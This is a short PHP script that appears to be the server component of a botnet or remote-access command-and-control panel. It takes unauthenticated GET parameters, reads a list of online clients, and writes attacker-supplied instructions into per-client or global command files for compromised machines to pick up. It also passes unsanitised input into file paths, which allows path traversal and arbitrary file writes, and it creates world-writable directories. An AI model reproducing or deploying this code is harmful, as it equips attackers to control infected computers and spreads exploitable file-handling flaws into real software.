<?php
$name        = $_GET['name'];
$user        = $_GET['user'];
$command     = $_GET['command'];
$instruction = $_GET['instruction'];

if ($name == "global") {
    
    if (!file_exists(base64_decode($user) . "/" . "global")) {
        mkdir(base64_decode($user) . "/" . "global", 0777);
    }
    
    //Create global command user list
    $data           = file_get_contents(base64_decode($user) . "/" . "online.txt");
    $globallocation = base64_decode($user) . "/" . "global/global.txt";
    $globalop = fopen($globallocation, 'w') or die("");
    fwrite($globalop, $data);
    fclose($globalop);
    
    //Create global command instruction
    $globalcommand = base64_decode($user) . "/" . "global/" . $command . ".txt";
    $globalopen = fopen($globalcommand, 'w') or die("");
    $globalwrite = $instruction;
    fwrite($globalopen, $globalwrite);
    fclose($globalopen);
} else {
    $single = base64_decode($user) . "/" . $name . "/" . $command . ".txt";
    $singleop = fopen($single, 'w') or die("");
    $singlewrite = $instruction;
    fwrite($singleop, $singlewrite);
    fclose($singleop);
    exit;
}
?>